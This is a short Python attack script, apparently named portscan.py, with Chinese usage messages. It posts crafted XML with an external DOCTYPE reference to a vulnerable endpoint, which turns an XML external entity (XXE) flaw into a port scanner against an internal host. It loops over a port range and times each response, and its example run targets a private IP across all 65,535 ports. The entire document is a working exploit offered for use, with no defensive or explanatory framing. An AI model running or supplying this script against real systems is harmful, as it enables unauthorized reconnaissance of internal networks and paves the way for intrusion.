import requests
import base64
import sys

def XXE(url,target,port):
	xml = """<?xml version="1.0" encoding="utf-8"?> """
	xml = xml + "\r\n" + """<!DOCTYPE data SYSTEM "http://{}:{}""".format(target,port) + """/" ["""
	xml = xml + "\r\n" + """<!ELEMENT data (#PCDATA)> """
	xml = xml + "\r\n" + """]>"""
	xml = xml + "\r\n" + """<data>7</data>"""
	r = requests.post(url, data=xml)
	print('[+] ',port,r.elapsed.total_seconds())

if __name__ == '__main__':
	try:
		print('''
[!] 用法：python3 portscan.py 漏洞网址 带扫描的目标IP 扫描端口范围 
[!] 示例：python3 portscan.py http://192.168.38.132/xxe_test.php 192.168.38.129 1-65535
						''')
		url = sys.argv[1]
		target = sys.argv[2]
		ports = sys.argv[3]
		start_port = int(ports.split('-')[0])
		if len(ports.split('-')) == 1:
			end_port = start_port + 1
		elif len(ports.split('-')) == 2:
			end_port = int((ports.split('-')[1])) + 1
		else:
			print('端口输入有误，请修改后重新执行')
		for i in range(start_port,end_port):
			XXE(url,target, str(i))
	except:
		print('[!] 请检查命令是否有误')
